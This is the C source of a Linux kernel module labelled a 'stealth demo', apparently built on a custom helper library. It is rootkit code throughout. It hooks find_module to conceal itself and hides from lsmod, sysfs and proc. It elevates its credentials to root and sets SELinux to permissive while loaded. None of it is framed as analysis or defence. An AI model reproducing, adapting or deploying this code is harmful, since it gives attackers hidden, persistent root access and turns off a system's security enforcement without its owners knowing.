/* SPDX-License-Identifier: GPL-2.0 */
#include <nvkmod.h>
#include <nvk_hook.h>
#include <nvk_hide.h>
#include <nvk_process.h>
#include <nvk_cred.h>
#include <nvk_mem.h>
#include <nvk_selinux.h>

#define NVK_LOG_TAG "nvk_stealth"
#include <nvk_log.h>

static struct nvk_hide_state hide_state = NVK_HIDE_INIT_STATE;
#ifdef NVK_STEALTH_SELINUX
static struct nvk_selinux_bypass selinux_state;
#endif

typedef void *(*find_module_fn)(const char *name);
static find_module_fn orig_find_module;

static int nvk_str_eq(const char *a, const char *b)
{
	while (*a && *b) {
		if (*a != *b) return 0;
		a++; b++;
	}
	return *a == *b;
}

static void *hook_find_module(const char *name)
{
	if (name && nvk_str_eq(name, "nvk_stealth"))
		return (void *)0;
	return orig_find_module(name);
}

static int nvk_stealth_init(void)
{
	int ret;
	void *target;

	ret = NVK_BOOTSTRAP();
	if (ret)
		return ret;

	nvk_log_info("init on %s\n", NVK_KERNEL_STR);

	nvk_mem_init();
	nvk_process_init();
	nvk_hide_init();
	nvk_cred_init();

	ret = nvk_hook_init();
	if (ret) {
		nvk_log_err("hook init: %s\n", nvk_hook_strerror(ret));
		return ret;
	}

	target = NVK_LOOKUP("find_module");
	if (target) {
		ret = nvk_hook_install(&hide_state.find_module_hook,
				       target, (void *)hook_find_module,
				       (void **)&orig_find_module);
		if (ret)
			nvk_log_warn("find_module hook: %s\n",
				     nvk_hook_strerror(ret));
		else
			nvk_log_info("find_module hooked\n");
	}

#ifdef NVK_STEALTH_FULL_HIDE
	nvk_mod_full_hide(&hide_state, &__this_module, "nvk_stealth");
	nvk_log_info("deep-hidden (list+sysfs+proc)\n");
#elif defined(NVK_STEALTH_HIDE)
	nvk_mod_hide(&hide_state, &__this_module);
	nvk_log_info("hidden from lsmod\n");
#else
	nvk_log_info("log-only mode\n");
#endif

#ifdef NVK_STEALTH_ROOT
	ret = nvk_cred_set_root();
	if (ret == 0)
		nvk_log_info("credentials elevated\n");
	else
		nvk_log_warn("cred elevation failed\n");
#endif

#ifdef NVK_STEALTH_SELINUX
	if (nvk_selinux_init() == 0) {
		nvk_log_info("selinux enforcing=%d\n",
			     nvk_selinux_is_enforcing());
		ret = nvk_selinux_set_permissive();
		if (ret == 0)
			nvk_log_info("selinux -> permissive\n");
		else
			nvk_log_warn("selinux set_permissive: %d\n", ret);
	}
#endif

	nvk_log_info("loaded by pid=%d\n", nvk_current_pid());
	return 0;
}

static void nvk_stealth_exit(void)
{
#ifdef NVK_STEALTH_SELINUX
	nvk_selinux_set_enforcing();
#endif
	_nvk_hide_cleanup(&hide_state, &__this_module);
	nvk_log_info("unloaded\n");
}

module_init(nvk_stealth_init);
module_exit(nvk_stealth_exit);

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("NeverC");
MODULE_DESCRIPTION("NeverC stealth demo");

NVK_DEFINE_MODULE("nvk_stealth");
